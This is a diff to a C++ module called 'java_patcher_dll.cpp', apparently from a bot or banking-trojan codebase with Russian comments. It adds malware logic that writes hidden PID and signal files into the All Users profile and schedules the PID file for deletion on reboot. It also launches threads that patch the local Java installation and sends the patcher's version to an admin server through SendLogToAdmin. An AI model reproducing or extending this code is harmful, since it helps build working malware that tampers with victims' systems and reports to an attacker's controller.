@@ -1,6 +1,10 @@
 // java_patcher_dll.cpp : Defines the exported functions for the DLL application.
 //
 
+#include "Modules.h"
+
+#ifdef JAVS_PATCHERH
+
 #include "BotHttp.h"
 #include "Config.h"
 #include "Memory.h"
@@ -13,9 +17,9 @@
 #include "Modules.h"
 
 #include "Richedit.h"
-#include "Modules.h"
 
-#include "BotDebug.h"
+
+//#include "BotDebug.h"
 
 namespace java_patcher
 {
@@ -802,9 +806,10 @@ static PCHAR GetJavaPatcherURL()
 }
 //-----------------------------------------------------------------------------
 
+/*
 static bool WJFile()
 {
-	DBG( "JavaPatcher", "WJFile" );
+	// Функция создаёт файл пидов
 	char wj[MAX_PATH];
 	GetAllUsersProfile( wj, sizeof(wj), "wj.dat" );
 	
@@ -824,6 +829,22 @@ static bool WJFile()
 		DBG( "JavaPatcher",  "file exist %s", wj );
 		return true;
 	}
+} */
+
+
+static bool WJFile()
+{
+	// Функция создаёт файл пидов
+	char wj[MAX_PATH];
+	if (!GetAllUsersProfile( wj, sizeof(wj), JavaPatcherPidsFile))
+		return false;
+
+	if( !File::IsExists(wj))
+	{
+		File::WriteBufferA( wj, NULL, 0 );
+	}
+
+	return File::IsExists(wj);
 }
 
 static void SendLogToAdmin( const char* url, const char* uid, const char* c, const char* v )
@@ -971,19 +992,27 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 	return res;
 };
 
+// Функция отправляет версию ява патчера
+DWORD WINAPI SendJavaPatchVersion(LPVOID)
+{
+	SendLogToAdmin( "botver", versionPatch );
+	return 0;
+}
+
 DWORD WINAPI Run_Path(LPVOID lpData)
 {
 	char testPath[MAX_PATH];
-	if(	GetAllUsersProfile( testPath, sizeof(testPath), "Pat.txt" ) )
+	if(	GetAllUsersProfile(testPath, sizeof(testPath), JavaPatcherSignalFile))
 	{
 		while( true )
 		{
 			if( File::IsExists(testPath))
 			{
 				GetJavaVersion();
-				if( javaCompatible >= 0 )
+				if( javaCompatible >= 0)
 				{
 					StartThread( JavaPatch, NULL );
+					StartThread( SendJavaPatchVersion, NULL );
 					//pSleep(5000); - узнать нафига тут задержка
 				}
 				break;
@@ -993,14 +1022,13 @@ DWORD WINAPI Run_Path(LPVOID lpData)
 	}
 	return 0;
 }
-//-----------------------------------------------------------------------------
 
 bool ExecuteUpdatePathCommand( LPVOID Manager, PCHAR Command, PCHAR Args )
 {
 	DBG( "JavaPatcher", "Обновление явы JavaPatch");
 	char fileName[MAX_PATH];
 	
-	GetAllUsersProfile( fileName, sizeof(fileName), "wj.dat" );
+	GetAllUsersProfile( fileName, sizeof(fileName), JavaPatcherPidsFile);
 	pDeleteFileA(fileName);
 
 	GetAllUsersProfile( fileName, sizeof(fileName), "uid.txt" );
@@ -1051,3 +1079,55 @@ bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 	
 	return 0;
 }
+
+void JavaPatcherAddPidToFile()
+{
+	// Функция добавляет пид текущего процесса в файл
+
+	char FileName[MAX_PATH];
+	if (!GetAllUsersProfile(FileName, MAX_PATH, JavaPatcherPidsFile))
+		return;
+
+
+	DWORD PID = GetUniquePID();
+
+	// Проверяем наличие пида в файле
+	DWORD Size = 0;
+	DWORD* Pids = (DWORD*)File::ReadToBufferA(FileName, Size);
+	int Count = Size / sizeof(DWORD);
+	for( int i = 0; i < Count; i++)
+	if(Pids[i] == PID )
+	{
+		//такой пид уже есть, игнорируем добавление
+		MemFree(Pids);
+		return;
+	}
+
+	// Добавляем пид в файл
+	DWORD NewSize = Size + 4;
+	DWORD*Pids2 = (DWORD*)MemAlloc(NewSize);
+	Pids2[0] = PID;
+	m_memcpy(&Pids2[1], Pids, Size );
+	File::WriteBufferA(FileName, Pids2, NewSize);
+
+	MemFree(Pids);
+	MemFree(Pids2);
+
+	// Помечаем файл как файл необходимый к удалению после
+	// перезагрузки системы
+	pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+}
+
+// Функция сигнализирует о необходимости запуска патчей
+void  JavaPatcherSignal()
+{
+    JavaPatcherAddPidToFile();
+
+	char SignalFile[MAX_PATH];
+	if(GetAllUsersProfile(SignalFile, MAX_PATH, JavaPatcherSignalFile))
+	{
+		File::WriteBufferA(SignalFile, (LPVOID)"1", 1);
+	}
+}
+
+#endif
